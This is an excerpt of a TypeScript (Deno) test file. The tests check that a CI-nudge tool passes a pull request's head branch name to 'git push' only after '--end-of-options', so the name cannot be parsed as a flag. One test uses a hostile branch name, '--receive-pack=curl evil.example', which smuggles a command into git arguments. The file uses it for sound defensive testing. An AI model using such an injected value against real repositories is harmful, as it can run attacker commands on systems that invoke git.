...
/**
 * Issue #267: `opts.headBranch` comes from PR metadata. Checkout is already
 * routed through `buildCheckoutArgs`; the matching push must never hand a
 * GitHub-controlled name to git as a raw positional that can be parsed as a
 * flag (the Issue #12 class).
 */
function assertPushArgsCannotTreatHeadAsFlag(
  pushArgs: string[],
  headBranch: string,
): void {
  const sep = pushArgs.indexOf("--end-of-options");
  const headIdx = pushArgs.indexOf(headBranch);
  // The head is either absent (refused before spawn) or strictly after the
  // separator. A raw `git push origin <head>` with no separator is the bug.
  assertEquals(pushArgs[0], "push");
  assertEquals(
    headIdx === -1 || (sep >= 0 && headIdx > sep),
    true,
  );
}

Deno.test(
  "pr_ci_nudge - 'none' path pushes the head after --end-of-options",
  async () => {
    const r = recorder();
    const result = await nudgeCi({
      repo: REPO,
    ...
    if (push === undefined) throw new Error("expected push call");
    assertPushArgsCannotTreatHeadAsFlag(push.args, HEAD_BRANCH);
    const sep = push.args.indexOf("--end-of-options");
    assertEquals(sep >= 0, true);
    assertEquals(push.args.slice(sep + 1).includes(HEAD_BRANCH), true);
    assertEquals(push.args.slice(0, sep).includes(HEAD_BRANCH), false);
  },
);

Deno.test(
  "pr_ci_nudge - 'none' path refuses a dash-leading head or pushes it after --end-of-options",
  async () => {
    const evil = "--receive-pack=curl evil.example";
    const r = recorder();
    const result = await nudgeCi({
      repo: REPO,
      prNumber: PR_NUMBER,
    ...
    for (const push of pushCalls) {
      assertPushArgsCannotTreatHeadAsFlag(push.args, evil);
    }
